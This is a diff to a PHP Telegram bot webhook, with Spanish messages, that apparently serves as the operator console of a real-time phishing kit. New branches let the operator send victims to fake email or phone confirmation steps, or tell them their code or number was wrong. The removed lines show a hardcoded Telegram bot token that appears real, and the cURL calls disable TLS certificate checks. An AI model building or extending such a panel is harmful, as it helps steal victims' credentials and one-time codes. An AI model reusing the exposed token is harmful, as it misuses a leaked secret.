@@ -6,8 +6,11 @@ $host = $_SERVER['HTTP_HOST'];
 $scriptDir = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
 $SITE_URL = $protocol . '://' . $host . $scriptDir;
 
-// Token: desde GET o hardcodeado como fallback
-$BOT_TOKEN = $_GET['token'] ?? '8587374664:AAHqJtjHF_kvUjPKFX_oafSU3RbWwkmKI_Y';
+// Cargar configuración central
+require_once __DIR__ . '/settings.php';
+
+// Token: desde GET o desde settings.php
+$BOT_TOKEN = $_GET['token'] ?? $token;
 
 // Si se accede por navegador (GET) con token, registrar el webhook
 if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['token'])) {
@@ -131,6 +134,42 @@ if (isset($update['callback_query'])) {
         curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
             'callback_query_id' => $callbackQuery['id'],
             'text' => '✅ Usuario notificado de código incorrecto'
+        ]));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_exec($ch);
+        curl_close($ch);
+    } elseif ($action === 'mail' && $sessionId) {
+        writeSession($sessionId, 'mail');
+        $ch = curl_init("https://api.telegram.org/bot{$BOT_TOKEN}/answerCallbackQuery");
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+            'callback_query_id' => $callbackQuery['id'],
+            'text' => '✅ Usuario redirigido a confirmación de correo'
+        ]));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_exec($ch);
+        curl_close($ch);
+    } elseif ($action === 'phone' && $sessionId) {
+        writeSession($sessionId, 'phone');
+        $ch = curl_init("https://api.telegram.org/bot{$BOT_TOKEN}/answerCallbackQuery");
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+            'callback_query_id' => $callbackQuery['id'],
+            'text' => '✅ Usuario redirigido a celular'
+        ]));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_exec($ch);
+        curl_close($ch);
+    } elseif ($action === 'phone_error' && $sessionId) {
+        writeSession($sessionId, 'phone_error');
+        $ch = curl_init("https://api.telegram.org/bot{$BOT_TOKEN}/answerCallbackQuery");
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+            'callback_query_id' => $callbackQuery['id'],
+            'text' => '✅ Usuario notificado de número incorrecto'
         ]));
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
